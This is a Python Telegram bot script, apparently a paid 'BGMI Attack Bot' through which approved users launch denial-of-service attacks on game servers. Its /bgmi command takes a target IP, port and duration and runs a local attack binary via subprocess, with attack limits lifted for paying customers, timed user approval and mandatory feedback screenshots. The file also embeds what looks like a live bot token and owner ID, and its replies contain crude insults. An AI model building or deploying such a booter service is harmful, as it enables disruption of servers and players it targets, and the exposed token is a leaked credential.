import os
import subprocess
import time
from datetime import datetime, timedelta
import threading
from telegram import Update, ParseMode
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext

# Bot Configuration
TOKEN = "7934506829:AAGMjxOzpL37pb3j94HiUO5IXU9AF53S2DY"
OWNER_ID = 1174779637  # Replace with your Telegram ID

# Global variables
bot_active = True
approved_users = set()
user_attack_count = {}
user_last_feedback = {}
banned_users = {}
logs_file = "attack_logs.txt"
users_file = "approved_users.txt"

# Load approved users from file
if os.path.exists(users_file):
    with open(users_file, "r") as f:
        approved_users = set(line.strip() for line in f.readlines())

# Load logs from file
if os.path.exists(logs_file):
    with open(logs_file, "r") as f:
        for line in f.readlines():
            parts = line.strip().split(":")
            if len(parts) >= 2:
                user_id = parts[0]
                count = int(parts[1])
                user_attack_count[user_id] = count

def save_users():
    with open(users_file, "w") as f:
        for user in approved_users:
            f.write(f"{user}\n")

def save_logs():
    with open(logs_file, "w") as f:
        for user_id, count in user_attack_count.items():
            f.write(f"{user_id}:{count}\n")

def is_owner(user_id):
    return str(user_id) == str(OWNER_ID)

def is_approved(user_id):
    return str(user_id) in approved_users or is_owner(user_id)

def is_banned(user_id):
    user_id = str(user_id)
    if user_id in banned_users:
        if datetime.now() < banned_users[user_id]:
            return True
        else:
            del banned_users[user_id]
    return False

def log_attack(user_id):
    user_id = str(user_id)
    user_attack_count[user_id] = user_attack_count.get(user_id, 0) + 1
    save_logs()

def start(update: Update, context: CallbackContext):
    if not bot_active:
        return
    
    user = update.effective_user
    welcome_message = (
        f"👋 *Welcome {user.first_name} to BGMI Attack Bot!* 👋\n\n"
        "This bot helps you launch attacks on BGMI servers.\n"
        "Use /help to see all available commands.\n\n"
        "🔥 *Happy Gaming!* 🔥"
    )
    update.message.reply_text(welcome_message, parse_mode=ParseMode.MARKDOWN)

def help_command(update: Update, context: CallbackContext):
    if not bot_active:
        return
    
    help_text = (
        "*Available Commands:*\n\n"
        "• /start - Welcome message\n"
        "• /help - Show this help message\n"
        "• /bgmi <ip> <port> <time> - Launch attack (max 180s)\n"
        "• /rule - Show rules\n"
        "• /feedback - Submit feedback (required after each attack)\n\n"
        "*Admin Commands:* (Owner only)\n"
        "• /admincmd - Show admin commands\n"
        "• /add <user_id> <duration> - Add user (duration: 1h, 1d, 1w, 1m)\n"
        "• /remove <user_id> - Remove user\n"
        "• /boton - Activate bot\n"
        "• /botoff - Deactivate bot\n"
        "• /allusers - List approved users\n"
        "• /logs - Show attack logs\n"
        "• /broadcast <message> - Send message to all users\n"
        "• /clearlogs - Clear all logs\n"
        "• /clearuser - Remove all users\n\n"
        "*Owner Contact:* [HMSahil](https://t.me/bgmikabhosada) @HMSahil"
    )
    update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)

def rule_command(update: Update, context: CallbackContext):
    if not bot_active:
        return
    
    rules = (
        "*📜 RULES 📜*\n\n"
        "1️⃣ MULTIPLE ATTACK NAHI LAGTA\n"
        "2️⃣ AGAR BOT USE NAHI KARNA ATA TO JAKA SEKH KA AA\n"
        "3️⃣ FEEDBACK DENA COMPULSORY HAI NAHI TO BAN HO JAYEGA\n"
        "4️⃣ SAME FEEDBACK DENA SA BHI BAN HO JAYEGA\n"
        "5️⃣ AUR KISE KA GROUP KA FEEDBACK DENA SA BHI BAN HO JAYA\n\n"
        "🔥 *BAST KHATAM HUA RULES* 🔥"
    )
    update.message.reply_text(rules, parse_mode=ParseMode.MARKDOWN)

def bgmi_command(update: Update, context: CallbackContext):
    if not bot_active:
        return
    
    user_id = str(update.effective_user.id)
    
    if is_banned(user_id):
        update.message.reply_text("You are currently banned from using this bot.")
        return
    
    # Check if user needs to give feedback
    if user_id in user_last_feedback and user_last_feedback[user_id] < user_attack_count.get(user_id, 0):
        update.message.reply_text("Phela feedback da tab he dusara attack laga sakta!")
        return
    
    if not is_approved(user_id):
        update.message.reply_text("You are not approved to use this bot. Contact owner @HMSahil")
        return
    
    if len(context.args) != 3:
        update.message.reply_text("Usage: /bgmi <ip> <port> <time>")
        return
    
    ip = context.args[0]
    port = context.args[1]
    try:
        attack_time = int(context.args[2])
    except ValueError:
        update.message.reply_text("Time must be a number")
        return
    
    if attack_time > 180:
        update.message.reply_text("Owner sa contact kar ka buy karla @HMSahil")
        return
    
    # Launch attack
    try:
        subprocess.Popen(["./fuck", ip, port, str(attack_time)])
        
        # Log the attack
        log_attack(user_id)
        
        # Send attack started message
        attack_msg = "🔥 *Ke pelam pali shuru ho gaya hai bgmi walo ka* 🔥"
        update.message.reply_text(attack_msg, parse_mode=ParseMode.MARKDOWN)
        
        # Schedule attack completion message
        def send_completion_message():
            time.sleep(attack_time)
            completion_msg = f"🚀 *Pel diya bgmi wala ko abb to feedback baj* 🚀\n\n*Username:* @{update.effective_user.username}"
            context.bot.send_message(chat_id=update.effective_chat.id, 
                                   text=completion_msg, 
                                   parse_mode=ParseMode.MARKDOWN)
        
        threading.Thread(target=send_completion_message).start()
        
    except Exception as e:
        update.message.reply_text(f"Error launching attack: {str(e)}")

def admin_commands(update: Update, context: CallbackContext):
    if not bot_active:
        return
    
    if not is_owner(update.effective_user.id):
        update.message.reply_text("OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU", parse_mode=ParseMode.MARKDOWN)
        return
    
    admin_text = (
        "*Admin Commands:*\n\n"
        "• /add <user_id> <duration> - Add user (1h, 1d, 1w, 1m)\n"
        "• /remove <user_id> - Remove user\n"
        "• /boton - Activate bot\n"
        "• /botoff - Deactivate bot\n"
        "• /allusers - List approved users\n"
        "• /logs - Show attack logs\n"
        "• /broadcast <message> - Send message to all users\n"
        "• /clearlogs - Clear all logs\n"
        "• /clearuser - Remove all users"
    )
    update.message.reply_text(admin_text, parse_mode=ParseMode.MARKDOWN)

def add_user(update: Update, context: CallbackContext):
    if not bot_active:
        return
    
    if not is_owner(update.effective_user.id):
        update.message.reply_text("OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU", parse_mode=ParseMode.MARKDOWN)
        return
    
    if len(context.args) < 2:
        update.message.reply_text("Usage: /add <user_id> <duration> (1h, 1d, 1w, 1m)")
        return
    
    user_id = context.args[0]
    duration = context.args[1]
    
    try:
        if duration.endswith('h'):
            hours = int(duration[:-1])
            expiry = datetime.now() + timedelta(hours=hours)
        elif duration.endswith('d'):
            days = int(duration[:-1])
            expiry = datetime.now() + timedelta(days=days)
        elif duration.endswith('w'):
            weeks = int(duration[:-1])
            expiry = datetime.now() + timedelta(weeks=weeks)
        elif duration.endswith('m'):
            months = int(duration[:-1])
            expiry = datetime.now() + timedelta(days=months*30)
        else:
            update.message.reply_text("Invalid duration format. Use 1h, 1d, 1w, or 1m")
            return
        
        approved_users.add(user_id)
        save_users()
        update.message.reply_text(f"User {user_id} added successfully until {expiry}")
    except Exception as e:
        update.message.reply_text(f"Error adding user: {str(e)}")

def remove_user(update: Update, context: CallbackContext):
    if not bot_active:
        return
    
    if not is_owner(update.effective_user.id):
        update.message.reply_text("OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU", parse_mode=ParseMode.MARKDOWN)
        return
    
    if len(context.args) < 1:
        update.message.reply_text("Usage: /remove <user_id>")
        return
    
    user_id = context.args[0]
    if user_id in approved_users:
        approved_users.remove(user_id)
        save_users()
        update.message.reply_text(f"User {user_id} removed successfully")
    else:
        update.message.reply_text(f"User {user_id} not found in approved users")

def bot_on(update: Update, context: CallbackContext):
    global bot_active
    if not is_owner(update.effective_user.id):
        update.message.reply_text("OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU", parse_mode=ParseMode.MARKDOWN)
        return
    
    bot_active = True
    update.message.reply_text("Bot is now ACTIVE")

def bot_off(update: Update, context: CallbackContext):
    global bot_active
    if not is_owner(update.effective_user.id):
        update.message.reply_text("OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU", parse_mode=ParseMode.MARKDOWN)
        return
    
    bot_active = False
    update.message.reply_text("Bot is now INACTIVE")

def all_users(update: Update, context: CallbackContext):
    if not bot_active:
        return
    
    if not is_owner(update.effective_user.id):
        update.message.reply_text("OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU", parse_mode=ParseMode.MARKDOWN)
        return
    
    if not approved_users:
        update.message.reply_text("EK BHI USER APPROVE NAHI HAI")
        return
    
    users_list = "\n".join(approved_users)
    update.message.reply_text(f"Approved Users:\n{users_list}")

def show_logs(update: Update, context: CallbackContext):
    if not bot_active:
        return
    
    if not is_owner(update.effective_user.id):
        update.message.reply_text("OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU", parse_mode=ParseMode.MARKDOWN)
        return
    
    if not os.path.exists(logs_file) or os.path.getsize(logs_file) == 0:
        update.message.reply_text("abhi Khali hai")
        return
    
    with open(logs_file, "rb") as f:
        context.bot.send_document(chat_id=update.effective_chat.id, document=f, filename="attack_logs.txt")

def broadcast(update: Update, context: CallbackContext):
    if not bot_active:
        return
    
    if not is_owner(update.effective_user.id):
        update.message.reply_text("OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU", parse_mode=ParseMode.MARKDOWN)
        return
    
    if len(context.args) < 1:
        update.message.reply_text("Usage: /broadcast <message>")
        return
    
    message = " ".join(context.args)
    for user in approved_users:
        try:
            context.bot.send_message(chat_id=user, text=f"📢 *Broadcast Message:*\n\n{message}", parse_mode=ParseMode.MARKDOWN)
        except Exception as e:
            print(f"Failed to send message to {user}: {str(e)}")
    
    update.message.reply_text(f"Broadcast sent to {len(approved_users)} users")

def clear_logs(update: Update, context: CallbackContext):
    if not bot_active:
        return
    
    if not is_owner(update.effective_user.id):
        update.message.reply_text("OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU", parse_mode=ParseMode.MARKDOWN)
        return
    
    if os.path.exists(logs_file):
        os.remove(logs_file)
    user_attack_count.clear()
    update.message.reply_text("All logs cleared")

def clear_users(update: Update, context: CallbackContext):
    if not bot_active:
        return
    
    if not is_owner(update.effective_user.id):
        update.message.reply_text("OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU", parse_mode=ParseMode.MARKDOWN)
        return
    
    approved_users.clear()
    save_users()
    update.message.reply_text("All users removed")

def feedback(update: Update, context: CallbackContext):
    if not bot_active:
        return
    
    user_id = str(update.effective_user.id)
    
    if user_id not in user_attack_count or user_attack_count.get(user_id, 0) == 0:
        update.message.reply_text("You haven't launched any attacks yet!")
        return
    
    if update.message.photo:
        # Check for duplicate feedback
        photo_id = update.message.photo[-1].file_id
        if user_id in user_last_feedback and user_last_feedback[user_id] == photo_id:
            # Ban user for 5 minutes for duplicate feedback
            banned_users[user_id] = datetime.now() + timedelta(minutes=5)
            update.message.reply_text("Same feedback detected! You are banned for 5 minutes.")
            return
        
        user_last_feedback[user_id] = photo_id
        update.message.reply_text("Feedback received! You can now launch another attack.")
    else:
        update.message.reply_text("Please send feedback as a photo")

def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    # Command handlers
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help_command))
    dp.add_handler(CommandHandler("rule", rule_command))
    dp.add_handler(CommandHandler("bgmi", bgmi_command))
    dp.add_handler(CommandHandler("feedback", feedback))
    
    # Admin command handlers
    dp.add_handler(CommandHandler("admincmd", admin_commands))
    dp.add_handler(CommandHandler("add", add_user))
    dp.add_handler(CommandHandler("remove", remove_user))
    dp.add_handler(CommandHandler("boton", bot_on))
    dp.add_handler(CommandHandler("botoff", bot_off))
    dp.add_handler(CommandHandler("allusers", all_users))
    dp.add_handler(CommandHandler("logs", show_logs))
    dp.add_handler(CommandHandler("broadcast", broadcast))
    dp.add_handler(CommandHandler("clearlogs", clear_logs))
    dp.add_handler(CommandHandler("clearuser", clear_users))
    
    # Feedback handler
    dp.add_handler(MessageHandler(Filters.photo, feedback))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()